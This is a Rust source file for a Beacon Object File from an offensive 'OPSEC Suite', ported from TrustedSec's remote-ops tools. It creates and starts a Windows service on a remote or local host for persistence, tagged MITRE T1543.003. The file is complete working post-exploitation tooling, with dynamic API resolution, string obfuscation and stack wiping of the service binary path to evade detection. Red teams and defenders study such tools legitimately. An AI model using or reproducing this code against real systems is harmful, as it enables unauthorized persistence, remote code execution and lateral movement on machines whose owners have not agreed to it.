// SPDX-FileCopyrightText: 2026 Dani <daniagungg@gmail.com>
// SPDX-License-Identifier: MIT
// Project: DEF-Situational-Awareness-BOF — Dani RustBOF OPSEC Suite
// Credit: Rust port + OPSEC hardening
// Original C: TrustedSec/cs-remote-ops/sc_create
//
//! Create + start a Windows service on a remote (or local) host.
//! Args: <target-UNC> <svc-name> <bin-path> <display>
//! Pass empty string "" for target to mean local SCM.

#![no_std]
#![cfg_attr(not(test), no_main)]

use rustbof::{println, eprintln};
use alloc::string::String;
use common::{mitre::Technique, dfr_fn, obf};

const TECHNIQUES: &[Technique] = &[
    Technique { id: "T1543.003", name: "Create or Modify System Process: Windows Service", tactic: "Persistence" },
];

const SC_MANAGER_CREATE_SERVICE: u32 = 0x0002;
const SC_MANAGER_CONNECT:        u32 = 0x0001;
const SERVICE_ALL_ACCESS:        u32 = 0xF01FF;
const SERVICE_WIN32_OWN_PROCESS: u32 = 0x10;
const SERVICE_DEMAND_START:      u32 = 0x3;
const SERVICE_ERROR_NORMAL:      u32 = 0x1;

dfr_fn!(
    open_sc_manager_a(machine: *const i8, db: *const i8, access: u32) -> usize,
    module = "advapi32.dll",
    api    = "OpenSCManagerA"
);

dfr_fn!(
    create_service_a(
        scm: usize, svc_name: *const i8, display: *const i8, access: u32,
        svc_type: u32, start_type: u32, error_ctrl: u32, bin_path: *const i8,
        load_grp: *const i8, tag_id: *mut u32, deps: *const i8,
        username: *const i8, password: *const i8,
    ) -> usize,
    module = "advapi32.dll",
    api    = "CreateServiceA"
);

dfr_fn!(
    start_service_a(svc: usize, argc: u32, argv: *const *const i8) -> i32,
    module = "advapi32.dll",
    api    = "StartServiceA"
);

dfr_fn!(
    close_service_handle(h: usize) -> i32,
    module = "advapi32.dll",
    api    = "CloseServiceHandle"
);

#[rustbof::main]
fn main(args: *mut u8, len: usize) {
    common::mitre::print_banner(env!("CARGO_PKG_NAME"), TECHNIQUES);    let mut parser = rustbof::data::DataParser::new(args, len);
    match run(&mut parser) {
        Ok(()) => {},
        Err(e) => eprintln!("[!] {}: {}", env!("CARGO_PKG_NAME"), e),
    }
}

fn run(parser: &mut rustbof::data::DataParser) -> Result<(), &'static str> {
    let target  = String::from(parser.get_str());
    let svc     = String::from(parser.get_str());
    let binpath = String::from(parser.get_str());
    let display = String::from(parser.get_str());
    let target  = target.as_str();
    let svc     = svc.as_str();
    let binpath = binpath.as_str();
    let display = display.as_str();

    if svc.is_empty() || binpath.is_empty() {
        return Err("usage: sc-create <\\\\host|''> <svc> <binpath> <display>");
    }

    let mut target_buf  = [0u8; 256];
    let mut svc_buf     = [0u8; 256];
    let mut bin_buf     = [0u8; 1024];
    let mut display_buf = [0u8; 256];

    let target_ptr = if target.is_empty() {
        core::ptr::null()
    } else {
        if target.len() >= target_buf.len() - 1 { return Err("target too long"); }
        target_buf[..target.len()].copy_from_slice(target.as_bytes());
        target_buf.as_ptr() as *const i8
    };
    if svc.len() >= svc_buf.len() - 1 { return Err("svc name too long"); }
    if binpath.len() >= bin_buf.len() - 1 { return Err("binpath too long"); }
    let display_use = if display.is_empty() { svc } else { display };
    if display_use.len() >= display_buf.len() - 1 { return Err("display too long"); }
    svc_buf[..svc.len()].copy_from_slice(svc.as_bytes());
    bin_buf[..binpath.len()].copy_from_slice(binpath.as_bytes());
    display_buf[..display_use.len()].copy_from_slice(display_use.as_bytes());

    let scm = unsafe {
        open_sc_manager_a(target_ptr, core::ptr::null(), SC_MANAGER_CONNECT | SC_MANAGER_CREATE_SERVICE)
    }.map_err(|_| "OpenSCManagerA resolve")?;
    if scm == 0 {
        common::evasion::secure_zero(&mut bin_buf);
        return Err("OpenSCManagerA failed (need admin?)");
    }

    let h_svc = unsafe {
        create_service_a(
            scm,
            svc_buf.as_ptr() as *const i8,
            display_buf.as_ptr() as *const i8,
            SERVICE_ALL_ACCESS,
            SERVICE_WIN32_OWN_PROCESS,
            SERVICE_DEMAND_START,
            SERVICE_ERROR_NORMAL,
            bin_buf.as_ptr() as *const i8,
            core::ptr::null(), core::ptr::null_mut(), core::ptr::null(),
            core::ptr::null(), core::ptr::null(),
        )
    }.map_err(|_| "CreateServiceA resolve")?;
    if h_svc == 0 {
        unsafe { let _ = close_service_handle(scm); };
        common::evasion::secure_zero(&mut bin_buf);
        return Err("CreateServiceA failed");
    }

    let started = unsafe { start_service_a(h_svc, 0, core::ptr::null()) }
        .map_err(|_| "StartServiceA resolve")?;

    unsafe {
        let _ = close_service_handle(h_svc);
        let _ = close_service_handle(scm);
    };

    // Wipe binpath on stack — never leak the path on success.
    common::evasion::secure_zero(&mut bin_buf);

    obf! { let ok = "service created"; }
    if started != 0 {
        println!("[+] {} ({}) started", ok, svc);
    } else {
        println!("[+] {} ({}) — start returned 0 (already running?)", ok, svc);
    }
    Ok(())
}
